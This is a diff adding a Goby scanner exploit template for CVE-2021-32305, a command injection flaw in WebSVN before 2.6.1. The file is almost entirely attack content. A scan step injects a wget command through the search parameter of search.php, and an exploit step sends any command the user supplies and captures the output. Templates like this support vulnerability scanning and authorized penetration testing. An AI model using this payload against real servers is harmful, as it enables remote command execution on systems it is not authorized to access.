@@ -1,0 +1,98 @@
+{
+      "Name": "WebSVN before 2.6.1 Injection RCE CVE-2021-32305",
+      "Level": "3",
+      "Tags": [
+            "sqli",
+            "rce"
+      ],
+      "GobyQuery": "title=\"WebSVN\"",
+      "Description": "WebSVN offers a view onto your subversion repositories that's been designed to reflect the Subversion methodology. You can view the log of any file or directory and see a list of all the files changed, added or deleted in any given revision. You can also view the differences between two versions of a file so as to see exactly what was changed in a particular revision.",
+      "Product": "WebSVN",
+      "Homepage": "https://websvnphp.github.io/",
+      "Author": "",
+      "Impact": "WebSVN before 2.6.1 allows remote attackers to execute arbitrary commands via shell metacharacters in the search parameter.",
+      "Recommendation": "https://github.com/websvnphp/websvn/pull/142",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2021-32305",
+            "http://packetstormsecurity.com/files/163225/Websvn-2.6.0-Remote-Code-Execution.html"
+      ],
+      "HasExp": true,
+      "ExpParams": [
+            {
+                  "Name": "Command",
+                  "Type": "input",
+                  "Value": ";wget+http%3A%2F%2Fwww.example.com%27;"
+            }
+      ],
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/search.php?search=%22;wget+http%3A%2F%2Fwww.example.com%27;%22",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "www.example.com",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "GET",
+                        "uri": "/search.php?search=%22{{{Command}}}%22",
+                        "follow_redirect": true,
+                        "header": null,
+                        "data_type": "text",
+                        "data": "",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|(.*)"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
